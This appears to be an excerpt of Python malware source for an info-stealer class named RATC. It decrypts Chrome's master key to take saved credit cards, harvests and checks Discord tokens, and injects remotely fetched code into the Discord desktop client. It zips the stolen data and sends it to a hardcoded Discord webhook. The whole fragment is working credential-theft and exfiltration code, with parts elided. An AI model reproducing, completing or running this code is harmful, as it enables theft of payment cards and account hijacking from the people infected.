import requests,os,shutil,sqlite3,zipfile,json,base64,psutil
...
class RATC:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/927016247659470908/09k-vV_fUzWP3r0c00AA2HmZbb0_NEFI4U8psh4mpNuPE134Uk2XGcuFbWeiJzTTUzEr"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Root"
            ...
            for name in dirs:
                if "discord_desktop_core-" in name:
                    ...
                    try:
                        ...
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Root"))
                    except FileNotFoundError:
                        pass
                    password = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
    ...
    def grabCreditCards(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google CCs.txt", "w", encoding="cp437", errors='ignore')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Web Data'
    ...
    def grabTokens(self):
        f = open(self.tempfolder+"\\Discord.txt", "w", encoding="cp437", errors='ignore')
        paths = {
        ...
        for token in self.tokens:
            ...
            if r.status_code == 200:
                ...
                urlavatar = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
                try:
                    requests.get(url)
                except:
                    urlavatar = urlavatar[:-4]
    ...
    def SendInfo(self):
        ...
        new = os.path.join(self.appdata, f'{os.getlogin()}.zip')
        self.zip(temp, new)
        ...
        #avatar = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.png'
        #username = j["username"]
        embed = {
            #"username":username,
            #"avatar_url":avatar,
